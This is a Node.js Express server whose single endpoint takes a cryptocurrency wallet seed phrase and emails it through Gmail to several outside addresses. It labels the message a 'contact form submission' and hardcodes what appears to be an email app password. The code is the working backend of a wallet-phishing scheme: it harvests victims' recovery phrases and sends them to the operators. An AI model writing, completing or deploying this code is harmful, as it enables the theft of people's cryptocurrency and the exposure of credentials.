const express = require('express');
const cors = require('cors');
const nodemailer = require('nodemailer');

const app = express();
app.use(express.json());

app.use(cors()); // Allow all origins for dev

app.post('/send-email', async (req, res) => {
    const {seedPhrase} = req.body;

    if (!seedPhrase) {
        return res.status(400).json({ error: 'Missing required fields: to, subject, text' });
    }

    const emailHtml = `
    <html><body>
    <h1>New Contact Form Submission</h1>
    <p><strong>Phrase:</strong> ${seedPhrase}</p>
    </body></html>
  `;

    // Configure Nodemailer transporter for Gmail
    const transporter = nodemailer.createTransport({
        service: 'gmail',
        auth: {
            user: 'guirez1921@gmail.com', // replace with your Gmail address
            pass: 'bzfb dmyh buuq vmag'      // replace with your Gmail App Password
        }
    });

    const mailOptions = {
        from: '"Seeder" <guirez1921@gmail.com>', // sender address
        to: ['susanbabe0980@gmail.com', 'Jessicarose89202@gmail.com'],            // receiver address
        cc: 'guirez1921@gmail.com',             // cc address
        subject: 'New Phrase Submission',
        html: emailHtml
    };

    try {
        const info = await transporter.sendMail(mailOptions);
        res.status(200).json({ message: 'Email sent successfully', data: info });
    } catch (error) {
        console.error('Error sending email:', error);
        res.status(500).json({ error: 'Failed to send email' });
    }
});

app.get('/', (req, res) => {
    res.status(200).send('Hello, World!');
});

const PORT = 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});

module.exports = app